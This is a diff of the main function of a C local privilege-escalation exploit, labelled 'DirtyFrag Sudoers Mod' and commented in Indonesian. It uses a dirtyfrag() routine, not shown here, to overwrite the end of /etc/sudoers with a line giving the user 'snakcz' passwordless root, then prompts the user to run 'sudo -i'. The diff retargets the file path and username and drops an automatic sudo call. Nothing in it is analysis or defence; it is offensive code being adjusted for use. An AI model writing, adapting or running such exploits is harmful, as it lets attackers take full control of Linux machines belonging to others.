@@ -1894,38 +1894,38 @@ static int run_root_pty(void)
 
 int main(int argc, char **argv)
 {
-	const char *path = "etc/sudoers";
-	const char *data = "\nsmoky ALL=(ALL:ALL) NOPASSWD:ALL #";
+    const char *path = "/etc/sudoers";
+    // Sesuaikan username 'snakcz' atau 'smoky' sesuai whoami lo
+    const char *data = "\nsnakcz ALL=(ALL:ALL) NOPASSWD:ALL #"; 
+    
+    printf("[*] DirtyFrag Sudoers Mod by Smoky\n");
 
-	printf("[*] DirtyFrag Sudoers Mod by Smoky\n");
+    if (getuid() == 0) {
+        execlp("/bin/bash", "bash", (char *)NULL);
+        return 0;
+    }
 
-	if (getuid() == 0) {
-		printf("[+] Sudah root! Spawning shell...\n");
-		execlp("/bin/bash", "bash", (char *)NULL);
-		return 0;
-	}
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        perror("[-] Gagal buka /etc/sudoers");
+        return 1;
+    }
+    struct stat st;
+    fstat(fd, &st);
+    close(fd);
 
-	int fd = open(path, O_RDONLY);
-	if (fd < 0) {
-		perror("[-] Gagal buka /etc/sudoers");
-		return 1;
-	}
-	struct stat st;
-	fstat(fd, &st);
-	close(fd);
+    loff_t offset = st.st_size - strlen(data);
+    if (offset < 0) {
+        printf("[-] File terlalu kecil.\n");
+        return 1;
+    }
 
-	loff_t offset = st.st_size - strlen(data);
-	if (offset < 0) {
-		printf("[-] File terlalu kecil.\n");
-		return 1;
-	}
-	printf("[+] Target: %s | Offset: %lld\n", path, (long long)offset);
+    printf("[+] Target: %s | Offset: %lld\n", path, (long long)offset);
+    printf("[*] Memulai eksploitasi via dirtyfrag()...\n");
 
-	printf("[*] Memulai eksploitasi...\n");
-	dirtyfrag(path, offset, data);
+    // PAKAI NAMA FUNGSI INI:
+    dirtyfrag(path, offset, data); 
 
-	printf("[+] Eksploitasi selesai. Mencoba 'sudo -i'...\n");
-	system("sudo -i");
-
-	return 0;
+    printf("[+] Selesai. Coba 'sudo -i' sekarang!\n");
+    return 0;
 }
